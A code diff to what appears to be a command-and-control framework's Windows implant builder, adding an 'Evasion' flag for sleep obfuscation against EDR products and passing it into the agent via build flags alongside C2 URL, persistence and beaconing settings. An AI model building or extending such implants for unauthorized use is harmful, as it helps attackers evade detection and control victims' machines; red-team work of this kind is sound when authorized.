@@ -295,6 +295,7 @@ type ImplantConfig struct {
 	Proxy         string // HTTP proxy URL (e.g. "http://proxy:8080")
 	CryptoKey     string // 32-byte hex key for StreamCipher (empty = disabled)
 	ExpiryDate    string // Compile-time expiry date "YYYY-MM-DD" (empty = disabled)
+	Evasion       bool   // Enable chunked sleep obfuscation (Windows EDR basics)
 }
 
 // GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
@@ -329,6 +330,7 @@ go 1.25
 require (
 	github.com/Microsoft/go-winio v0.6.2
 	golang.org/x/sys v0.42.0
+	modernc.org/sqlite v1.52.0
 )
 `
 
@@ -367,7 +369,12 @@ require (
 		p2pListenAddr = cfg.P2PListenAddr
 	}
 
-	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s"`,
+	evasion := "false"
+	if cfg.Evasion {
+		evasion = "true"
+	}
+
+	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s"`,
 		escape(cfg.C2URL),
 		cfg.Interval,
 		cfg.Jitter,
@@ -386,6 +393,7 @@ require (
 		escape(cfg.Proxy),
 		escape(cfg.CryptoKey),
 		escape(cfg.ExpiryDate),
+		evasion,
 	)
 
 	// Output filename
